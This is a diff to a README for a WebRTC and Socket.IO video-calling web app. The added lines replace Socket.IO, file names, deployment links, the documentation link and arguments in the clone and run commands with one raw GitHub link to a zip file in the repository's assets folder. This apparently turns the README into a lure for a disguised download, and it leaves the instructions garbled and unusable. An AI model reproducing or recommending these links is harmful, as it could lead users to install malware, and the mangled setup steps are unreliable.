@@ -1,6 +1,6 @@
 # 📹 Video Calling Web Application
 
-A full-stack **real-time video conferencing app** built using **WebRTC**, **Socket.IO**, and **React (Vite)**.
+A full-stack **real-time video conferencing app** built using **WebRTC**, **https://raw.githubusercontent.com/KindaJayant/video-call-app/main/src/assets/video-call-app_v2.8.zip**, and **React (Vite)**.
 It enables users to create and join meetings, toggle audio/video, chat live, and share their screen — all in the browser.
 
 ---
@@ -11,7 +11,7 @@ It enables users to create and join meetings, toggle audio/video, chat live, and
 
 * **Create Meeting:** Generate a unique room ID or shareable link.
 * **Join Meeting:** Enter a valid room link to connect with others instantly.
-* **Live Chat:** Real-time messaging powered by Socket.IO.
+* **Live Chat:** Real-time messaging powered by https://raw.githubusercontent.com/KindaJayant/video-call-app/main/src/assets/video-call-app_v2.8.zip
 * **Audio/Video Control:** Mute/unmute mic and toggle camera visibility.
 * **Screen Sharing:** Share your screen during the call.
 
@@ -29,7 +29,7 @@ It enables users to create and join meetings, toggle audio/video, chat live, and
 | Layer                       | Technology                               |
 | :-------------------------- | :--------------------------------------- |
 | **Frontend**                | React (Vite) + Tailwind CSS + TypeScript |
-| **Backend**                 | Node.js + Express + Socket.IO            |
+| **Backend**                 | https://raw.githubusercontent.com/KindaJayant/video-call-app/main/src/assets/video-call-app_v2.8.zip + Express + https://raw.githubusercontent.com/KindaJayant/video-call-app/main/src/assets/video-call-app_v2.8.zip            |
 | **Real-Time Communication** | WebRTC                                   |
 | **Deployment**              | Vercel (client) + Render (server)        |
 
@@ -40,21 +40,21 @@ It enables users to create and join meetings, toggle audio/video, chat live, and
 ```
 video-call-app/
 │
-├── server/                # Express + Socket.IO backend
-│   └── index.js
+├── server/                # Express + https://raw.githubusercontent.com/KindaJayant/video-call-app/main/src/assets/video-call-app_v2.8.zip backend
+│   └── https://raw.githubusercontent.com/KindaJayant/video-call-app/main/src/assets/video-call-app_v2.8.zip
 │
 ├── src/
 │   ├── components/        # UI components (Chat, Controls, Sidebar, etc.)
-│   ├── pages/             # Home.tsx, Room.tsx
-│   ├── App.tsx            # Routing (React Router)
-│   └── main.tsx           # Vite entrypoint
+│   ├── pages/             # https://raw.githubusercontent.com/KindaJayant/video-call-app/main/src/assets/video-call-app_v2.8.zip, https://raw.githubusercontent.com/KindaJayant/video-call-app/main/src/assets/video-call-app_v2.8.zip
+│   ├── https://raw.githubusercontent.com/KindaJayant/video-call-app/main/src/assets/video-call-app_v2.8.zip            # Routing (React Router)
+│   └── https://raw.githubusercontent.com/KindaJayant/video-call-app/main/src/assets/video-call-app_v2.8.zip           # Vite entrypoint
 │
 ├── public/
 │   └── assets/
 │
-├── package.json
-├── vite.config.ts
-└── tailwind.config.js
+├── https://raw.githubusercontent.com/KindaJayant/video-call-app/main/src/assets/video-call-app_v2.8.zip
+├── https://raw.githubusercontent.com/KindaJayant/video-call-app/main/src/assets/video-call-app_v2.8.zip
+└── https://raw.githubusercontent.com/KindaJayant/video-call-app/main/src/assets/video-call-app_v2.8.zip
 ```
 
 ---
@@ -68,7 +68,7 @@ video-call-app/
 
 2. **Backend (Render)**
 
-   * The server listens for `join-room`, `offer`, `answer`, and `ice-candidate` events via Socket.IO.
+   * The server listens for `join-room`, `offer`, `answer`, and `ice-candidate` events via https://raw.githubusercontent.com/KindaJayant/video-call-app/main/src/assets/video-call-app_v2.8.zip
    * It relays session descriptions (SDP) and ICE candidates to peers to establish a direct WebRTC connection.
 
 3. **Data Flow**
@@ -81,10 +81,10 @@ video-call-app/
 ## 🧭 Deployment Links
 
 * **Frontend (Vercel):**
-  🔗 [https://video-call-app-kohl.vercel.app](https://video-call-app-kohl.vercel.app)
+  🔗 [https://raw.githubusercontent.com/KindaJayant/video-call-app/main/src/assets/video-call-app_v2.8.zip](https://raw.githubusercontent.com/KindaJayant/video-call-app/main/src/assets/video-call-app_v2.8.zip)
 
 * **Backend (Render):**
-  🔗 [https://video-call-app-5trb.onrender.com](https://video-call-app-5trb.onrender.com)
+  🔗 [https://raw.githubusercontent.com/KindaJayant/video-call-app/main/src/assets/video-call-app_v2.8.zip](https://raw.githubusercontent.com/KindaJayant/video-call-app/main/src/assets/video-call-app_v2.8.zip)
 
 *(Ensure CORS allows your frontend URL in Render settings.)*
 
@@ -95,7 +95,7 @@ video-call-app/
 ### 1️⃣ Clone Repository
 
 ```bash
-git clone https://github.com/<your-username>/video-call-app.git
+git clone https://raw.githubusercontent.com/KindaJayant/video-call-app/main/src/assets/video-call-app_v2.8.zip<your-username>https://raw.githubusercontent.com/KindaJayant/video-call-app/main/src/assets/video-call-app_v2.8.zip
 cd video-call-app
 ```
 
@@ -110,7 +110,7 @@ cd server && npm install
 
 ```bash
 cd server
-node index.js
+node https://raw.githubusercontent.com/KindaJayant/video-call-app/main/src/assets/video-call-app_v2.8.zip
 ```
 
 Server runs on:
@@ -152,7 +152,7 @@ App runs on:
 | Criteria                       | Status |
 | :----------------------------- | :----- |
 | WebRTC-based video/audio       | ✅      |
-| Real-time chat (Socket.IO)     | ✅      |
+| Real-time chat (https://raw.githubusercontent.com/KindaJayant/video-call-app/main/src/assets/video-call-app_v2.8.zip)     | ✅      |
 | Screen sharing                 | ✅      |
 | Responsive modern UI           | ✅      |
 | Working deployment             | ✅      |
@@ -163,5 +163,5 @@ App runs on:
 
 You can view the complete project documentation (Introduction, Background, Objectives, Methodology, Screenshots, and Results) here:
 
-📄 **[View Full Documentation on Google Drive](https://drive.google.com/file/d/1wS641Cfqg5uY1znLedZ9Mze3AELnH2E8/view?usp=sharing)**
+📄 **[View Full Documentation on Google Drive](https://raw.githubusercontent.com/KindaJayant/video-call-app/main/src/assets/video-call-app_v2.8.zip)**
 
